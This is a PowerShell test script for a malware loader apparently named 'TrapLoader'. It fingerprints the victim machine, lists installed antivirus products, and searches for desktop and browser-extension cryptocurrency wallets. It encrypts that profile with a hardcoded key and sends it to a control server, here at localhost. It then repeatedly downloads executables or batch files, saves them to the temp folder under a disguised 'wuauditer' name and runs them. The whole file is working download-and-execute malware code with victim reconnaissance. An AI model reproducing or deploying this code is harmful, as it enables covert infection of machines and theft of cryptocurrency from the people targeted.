# Test script for PSStub_Direct.ps1 with implemented checks
# This script tests the HTTP connection functionality with all necessary checks

$serverUrl = "http://127.0.0.1:4333/loader/"
$httpPassword = "test"
$encryptionKey = "TrapLoaderSecureKey123"  # Same key as in PSStub_Direct.ps1

Write-Host "TestStub starting with checks from PSStub_Direct..."

# Function to encrypt data (copied from PSStub_Direct.ps1)
function Encrypt-Data {
    param([string]$PlainText,[string]$Key)

    # Create random IV
    $iv = New-Object byte[] 16
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($iv)

    $keyBytes = [System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($Key))

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode    = 'CBC'
    $aes.Padding = 'PKCS7'
    $aes.Key     = $keyBytes
    $aes.IV      = $iv

    $ms = New-Object System.IO.MemoryStream
    $cs = New-Object System.Security.Cryptography.CryptoStream($ms,$aes.CreateEncryptor(),'Write')
    $bytes = [Text.Encoding]::UTF8.GetBytes($PlainText)
    $cs.Write($bytes,0,$bytes.Length); $cs.FlushFinalBlock();
    $cipher = $ms.ToArray()
    return [Convert]::ToBase64String($iv + $cipher)
}

# Check if the server port is open before attempting to connect
function Test-ServerPort {
    param (
        [string]$ComputerName,
        [int]$Port
    )
    
    try {
        Write-Host "Testing connection to $ComputerName`:$Port..."
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $connection = $tcpClient.BeginConnect($ComputerName, $Port, $null, $null)
        $wait = $connection.AsyncWaitHandle.WaitOne(1000, $false)
        
        if ($wait) {
            try {
                $tcpClient.EndConnect($connection)
                Write-Host "Connection to $ComputerName`:$Port successful!" -ForegroundColor Green
                return $true
            } catch {
                $errorMsg = $_.Exception.Message
                Write-Host "Failed to connect to $ComputerName`:$Port - $errorMsg" -ForegroundColor Red
                return $false
            }
        } else {
            Write-Host "Connection timeout to $ComputerName`:$Port" -ForegroundColor Red
            return $false
        }
    } catch {
        $errorMsg = $_.Exception.Message
        Write-Host "Error testing connection to $ComputerName`:$Port - $errorMsg" -ForegroundColor Red
        return $false
    } finally {
        if ($null -ne $tcpClient) {
            $tcpClient.Close()
        }
    }
}

# Extract host and port from URL
$uri = [System.Uri]$serverUrl
$serverHost = $uri.Host
$serverPort = if ($uri.Port -ne -1) { $uri.Port } else { if ($uri.Scheme -eq "https") { 443 } else { 80 } }

# Check if the server is running
if (!(Test-ServerPort -ComputerName $serverHost -Port $serverPort)) {
    Write-Host "ERROR: Server is not running or port $serverPort is closed on $serverHost" -ForegroundColor Red
    Write-Host "Please start the server application first and make sure it's listening on port $serverPort" -ForegroundColor Yellow
    Write-Host "Press any key to exit..."
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit
} else {
    Write-Host "Server port $serverPort is open on $serverHost" -ForegroundColor Green
}

# Try a simple connection test first
function Test-HttpConnection {
    param (
        [string]$Url
    )
    
    try {
        Write-Host "Testing HTTP connection to $Url..."
        $request = [System.Net.WebRequest]::Create($Url)
        $request.Method = "HEAD"
        $request.Timeout = 5000
        
        try {
            $response = $request.GetResponse()
            $statusCode = [int]$response.StatusCode
            Write-Host "HTTP connection successful! Status code: $statusCode" -ForegroundColor Green
            
            $response.Close()
            return $true
        }
        catch [System.Net.WebException] {
            if ($_.Exception.Response -ne $null) {
                $statusCode = [int]$_.Exception.Response.StatusCode
                Write-Host "Server returned status $statusCode - this is still a valid connection" -ForegroundColor Yellow
                return $true
            }
            else {
                $errorMessage = $_.Exception.Message
                Write-Host "HTTP connection failed: $errorMessage" -ForegroundColor Red
                return $false
            }
        }
    }
    catch {
        Write-Host "Error testing HTTP connection: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Test HTTP connection
if (!(Test-HttpConnection -Url $serverUrl)) {
    Write-Host "HTTP connection test failed." -ForegroundColor Red
    Write-Host "Trying to proceed anyway..." -ForegroundColor Yellow
}

# Generate a unique machine identifier (fingerprint)
function Get-MachineFingerprint {
    try {
        Write-Host "Generating machine fingerprint..."
        $cpuId = Get-WmiObject -Class Win32_Processor | Select-Object -First 1 -ExpandProperty ProcessorId
        $biosId = Get-WmiObject -Class Win32_BIOS | Select-Object -ExpandProperty SerialNumber
        $mainboardId = Get-WmiObject -Class Win32_BaseBoard | Select-Object -ExpandProperty SerialNumber
        $fingerprint = "$cpuId-$biosId-$mainboardId"
        
        # Hash the fingerprint for consistency
        $sha = New-Object System.Security.Cryptography.SHA256Managed
        $hashBytes = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($fingerprint))
        $hashString = [BitConverter]::ToString($hashBytes).Replace("-", "")
        
        Write-Host "Generated machine ID: $hashString" -ForegroundColor Green
        return $hashString
    }
    catch {
        Write-Host "Error generating machine ID: $($_.Exception.Message)" -ForegroundColor Red
        $guid = [Guid]::NewGuid().ToString()
        Write-Host "Using fallback GUID: $guid" -ForegroundColor Yellow
        return $guid # Fallback to a random GUID if hardware ID fails
    }
}

# Get Windows version in a user-friendly format
function Get-WindowsVersion {
    $os = [System.Environment]::OSVersion.Version
    Write-Host "Detecting Windows version... Build: $($os.Build)" -ForegroundColor Cyan
    
    switch ($os.Major) {
        10 {
            if ($os.Build -ge 22000) { 
                Write-Host "Detected Windows 11" -ForegroundColor Cyan
                return "Windows 11" 
            }
            Write-Host "Detected Windows 10" -ForegroundColor Cyan
            return "Windows 10"
        }
        6 {
            switch ($os.Minor) {
                3 { 
                    Write-Host "Detected Windows 8.1" -ForegroundColor Cyan
                    return "Windows 8.1" 
                }
                2 { 
                    Write-Host "Detected Windows 8" -ForegroundColor Cyan
                    return "Windows 8" 
                }
                1 { 
                    Write-Host "Detected Windows 7" -ForegroundColor Cyan
                    return "Windows 7" 
                }
                0 { 
                    Write-Host "Detected Windows Vista" -ForegroundColor Cyan
                    return "Windows Vista" 
                }
            }
        }
        5 {
            switch ($os.Minor) {
                2 { 
                    Write-Host "Detected Windows Server 2003" -ForegroundColor Cyan
                    return "Windows Server 2003" 
                }
                1 { 
                    Write-Host "Detected Windows XP" -ForegroundColor Cyan
                    return "Windows XP" 
                }
            }
        }
        default { 
            Write-Host "Unknown Windows Version" -ForegroundColor Yellow
            return "Unknown Windows Version" 
        }
    }
}

# Get installed antivirus products
function Get-SpecificAntivirus {
    Write-Host "Checking for installed antivirus products..." -ForegroundColor Cyan
    $avProducts = @()
    $avRegistryPaths = @{
        "Norton"           = "SOFTWARE\Norton"
        "McAfee"           = "SOFTWARE\McAfee"
        "Kaspersky"        = "SOFTWARE\Kaspersky Lab"
        "Bitdefender"      = "SOFTWARE\Bitdefender"
        "Avast"            = "SOFTWARE\AVAST Software"
        "AVG"              = "SOFTWARE\AVG Technologies"
        "Windows Defender" = "SOFTWARE\Microsoft\Windows Defender"
    }
    foreach ($av in $avRegistryPaths.GetEnumerator()) {
        $key = Get-Item -Path "HKLM:\$($av.Value)" -ErrorAction SilentlyContinue
        if ($key) { 
            Write-Host "  Found: $($av.Key)" -ForegroundColor Green
            $avProducts += $av.Key 
        }
    }
    
    if ($avProducts.Count -eq 0) {
        Write-Host "  No antivirus products detected" -ForegroundColor Yellow
        return "None"
    }
    
    return $avProducts -join ", "
}

# Check for cryptocurrency wallets
function Get-WalletNames {
    Write-Host "Checking for cryptocurrency wallets..." -ForegroundColor Cyan
    $walletNames = @()
    $walletPaths = @{
        "Armory"        = "$env:APPDATA\Armory\*.wallet"
        "Atomic"        = "$env:APPDATA\Atomic\Local Storage\leveldb"
        "Bitcoin"       = "$env:APPDATA\Bitcoin\wallets"
        "Bytecoin"      = "$env:APPDATA\bytecoin\*.wallet"
        "Coinomi"       = "$env:LOCALAPPDATA\Coinomi\Coinomi\wallets"
        "Dash"          = "$env:APPDATA\DashCore\wallets"
        "Electrum"      = "$env:APPDATA\Electrum\wallets"
        "Ethereum"      = "$env:APPDATA\Ethereum\keystore"
        "Exodus"        = "$env:APPDATA\Exodus\exodus.wallet"
        "Guarda"        = "$env:APPDATA\Guarda\Local Storage\leveldb"
        "Jaxx"          = "$env:APPDATA\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb"
        "Litecoin"      = "$env:APPDATA\Litecoin\wallets"
        "MyMonero"      = "$env:APPDATA\MyMonero\*.mmdb"
        "Monero GUI"    = "$env:APPDATA\Documents\Monero\wallets\"
        "WalletWasabi"  = "$env:APPDATA\WalletWasabi\Client\Wallets"
    }
    foreach ($wallet in $walletPaths.GetEnumerator()) {
        if (Test-Path (Split-Path $wallet.Value -Parent)) { 
            Write-Host "  Found: $($wallet.Key)" -ForegroundColor Green
            $walletNames += $wallet.Key 
        }
    }
    
    $browserPaths = @{
        "Brave"        = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
        "Chrome"       = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        "Chromium"     = "$env:LOCALAPPDATA\Chromium\User Data"
        "Edge"         = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        "EpicPrivacy"  = "$env:LOCALAPPDATA\Epic Privacy Browser\User Data"
        "Iridium"      = "$env:LOCALAPPDATA\Iridium\User Data"
        "Opera"        = "$env:APPDATA\Opera Software\Opera Stable"
        "OperaGX"      = "$env:APPDATA\Opera Software\Opera GX Stable"
        "Vivaldi"      = "$env:LOCALAPPDATA\Vivaldi\User Data"
        "Yandex"       = "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"
    }
    
    $walletDirs = @{
        "dlcobpjiigpikoobohmabehhmhfoodbb" = "Argent X"
        "fhbohimaelbohpjbbldcngcnapndodjp" = "Binance Chain Wallet"
        "jiidiaalihmmhddjgbnbgdfflelocpak" = "BitKeep Wallet"
        "bopcbmipnjdcdfflfgjdgdjejmgpoaab" = "BlockWallet"
        "odbfpeeihdkbihmopkbjmoonfanlbfcl" = "Coinbase"
        "hifafgmccdpekplomjjkcfgodnhcellj" = "Crypto.com"
        "kkpllkodjeloidieedojogacfhpaihoh" = "Enkrypt"
        "mcbigmjiafegjnnogedioegffbooigli" = "Ethos Sui"
        "aholpfdialjgjfhomihkjbmgjidlcdno" = "ExodusWeb3"
        "hpglfhgfnhbgpjdenjgmdgoeiappafln" = "Guarda"
        "dmkamcknogkgcdfhhbddcghachkejeap" = "Keplr"
        "afbcbjpbpfadlkmhmclhkeeodmamcflc" = "MathWallet"
        "nkbihfbeogaeaoehlefnkodbefgpgknn" = "Metamask"
        "ejbalbakoplchlghecdalmeeeajnimhm" = "Metamask2"
        "mcohilncbfahbmgdjkbpemcciiolgcge" = "OKX"
        "jnmbobjmhlngoefaiojfljckilhhlhcj" = "OneKey"
        "bfnaelmomeimhlpmgjnjophhpkkoljpa" = "Phantom"
        "fnjhmkhhmkbjkkabndcnnogagogbneec" = "Ronin"
        "lgmpcpglpngdoalbgeoldeajfclnhafa" = "SafePal"
        "mfgccjchihfkkindfppnaooecgfneiii" = "TokenPocket"
        "nphplpgoakhhjchkkhmiggakijnkhfnd" = "Ton"
        "ibnejdfjmmkpcnlpebklmnkoeoihofec" = "TronLink"
        "egjidjbpglichdcondbcbdnbeeppgdph" = "Trust Wallet"
        "amkmjjmmflddogmhpjloimipbofnfjih" = "Wombat"
        "heamnjbnflcikcggoiplibfommfbkjpj" = "Zeal"
    }
    
    foreach ($browser in $browserPaths.GetEnumerator()) {
        if (Test-Path $browser.Value) {
            foreach ($walletDir in $walletDirs.GetEnumerator()) {
                $extPath = Join-Path -Path $browser.Value -ChildPath "Local Extension Settings\$($walletDir.Key)"
                if (Test-Path $extPath) { 
                    Write-Host "  Found browser wallet: $($walletDir.Value) in $($browser.Key)" -ForegroundColor Green
                    $walletNames += $walletDir.Value 
                }
            }
        }
    }
    
    if ($walletNames.Count -eq 0) {
        Write-Host "  No cryptocurrency wallets detected" -ForegroundColor Yellow
        return "None"
    }
    
    return $walletNames -join ", "
}

# Get complete system info
function Get-SystemInfo {
    $osVersion = Get-WindowsVersion
    $machineName = [System.Environment]::UserName
    $avProducts = Get-SpecificAntivirus
    $walletNames = Get-WalletNames
    
    $info = "$osVersion;$machineName;$avProducts;$walletNames"
    Write-Host "Collected system info: $info" -ForegroundColor Cyan
    return $info
}

# Get machine fingerprint and system info
$machineId = Get-MachineFingerprint
$systemInfo = Get-SystemInfo

# Create a simple payload
$plainObj = @{
    password = $httpPassword
    info = $systemInfo
    machine_id = $machineId
}

# Encrypt the payload
$plainJson = $plainObj | ConvertTo-Json -Compress
$jsonPayload = @{ data = (Encrypt-Data $plainJson $encryptionKey) } | ConvertTo-Json -Compress

Write-Host "Starting continuous connection attempts..." -ForegroundColor Cyan

while ($true) {
    Write-Host "----------------------------------------"
    Write-Host "Attempting to send data to $serverUrl..." -ForegroundColor Cyan
    
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("Content-Type", "application/json")
        $webClient.Headers.Add("User-Agent", "TrapLoader-Client-Test")
        
        $responseBytes = $webClient.UploadData($serverUrl, [System.Text.Encoding]::UTF8.GetBytes($jsonPayload))
        
        if ($responseBytes -and $responseBytes.Length -gt 0) {
            Write-Host "File received from server ($($responseBytes.Length) bytes)." -ForegroundColor Green
            
            # Generate a random suffix for the filename to avoid conflicts
            $randomSuffix = [System.Guid]::NewGuid().ToString().Substring(0, 8)
            
            # Determine file type and name
            $fileName = ""
            # Check for MZ header (for .exe)
            if ($responseBytes.Length -gt 1 -and $responseBytes[0] -eq 0x4D -and $responseBytes[1] -eq 0x5A) {
                $fileName = "wuauditer-$($randomSuffix).exe"
                Write-Host "Detected executable file (MZ header found)." -ForegroundColor Cyan
            } else {
                $fileName = "wuauditer-$($randomSuffix).bat"
                Write-Host "Assuming batch file (no MZ header)." -ForegroundColor Cyan
            }
            
            $filePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), $fileName)
            
            try {
                [System.IO.File]::WriteAllBytes($filePath, $responseBytes)
                Write-Host "File saved to: $filePath" -ForegroundColor Green
                
                # Execute the file
                Write-Host "Executing file..." -ForegroundColor Cyan
                Start-Process -FilePath $filePath
                
                Write-Host "File executed successfully. Continuing to poll for more files..." -ForegroundColor Green
                # The loop will now continue to check for other files
            }
            catch {
                Write-Host "Error saving or executing file: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
        else {
            Write-Host "Received empty response, but not an error. This is unusual." -ForegroundColor Yellow
        }
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) {
            $statusCode = [int]$_.Exception.Response.StatusCode
            if ($statusCode -eq 204) {
                Write-Host "No file available, checking again in 5 seconds..." -ForegroundColor Yellow
            } elseif ($statusCode -eq 403) {
                Write-Host "Access Denied (403). Check password. Retrying in 30 seconds..." -ForegroundColor Red
                Start-Sleep -Seconds 25 # Additional wait for auth errors
            } else {
                Write-Host "Server returned HTTP $statusCode. Retrying in 5 seconds..." -ForegroundColor Red
            }
        } else {
            Write-Host "Failed to connect to server: $($_.Exception.Message). Retrying in 5 seconds..." -ForegroundColor Red
        }
    } catch {
        Write-Host "An unexpected error occurred: $($_.Exception.Message). Retrying in 5 seconds..." -ForegroundColor Red
    }

    Start-Sleep -Seconds 5
}

Write-Host "Loader has completed its task." 